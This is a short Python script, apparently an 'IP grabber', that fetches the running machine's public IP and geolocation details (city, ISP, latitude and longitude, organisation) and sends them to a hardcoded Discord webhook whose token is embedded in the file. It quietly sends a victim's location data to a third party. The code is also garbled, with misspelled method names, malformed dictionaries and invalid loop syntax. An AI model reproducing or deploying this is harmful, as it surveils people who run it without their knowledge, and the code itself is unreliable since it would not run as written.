import requests
import json
from dhooks import Webhook, Embed 
from datetime import datetime


hook = Webhook("https://discord.com/api/webhooks/766365269370601562/b4tDfhvyT6aNcZ2R3p1pFrxAMMwV044aw39jCGlaaiLUWvFRyR2oMv6PV74VwihJJQgK")

time = datetime.now().starttime("%H%M %p")
ip = request.get('https://api.ipify.org/')

r = requests.get(f'https://extreme-ip-lookup.com/json/{ip}')
geo = r.json()
embed = embed()
fields = [
{'name' ": 'ip', 'value: geo['query']"},
{'name' ": 'ipType', 'value': geo['ipType']"}
{'name' ": 'Country', 'value': geo['country']"}
{'name' ": 'countryCode', 'value': geo['countrycode']"}
{'name' ": 'City', 'value': geo['city']"}
{'name' ": 'Continent', 'value': geo['Continent']"}
{'name' ": 'IPName', 'value': geo['IPName']"}
{'name' ": 'ISP', 'value': geo['isp']"}
{'name' ": 'latitute', 'value': geo['lat']"}
{'name' ": 'Longitude', 'value': geo['lon']"}
{'name' ": 'Org', 'value': geo['org']"}
{'name' ": 'Region', 'value': geo['region']"}
{'name' ": 'Status', 'value': geo['status']"}
]
for fields in fields
  if field['value']:
    embed.add_filed(name=field['name'], value=field['value'], inline=True)
hook.send(embed=embed)
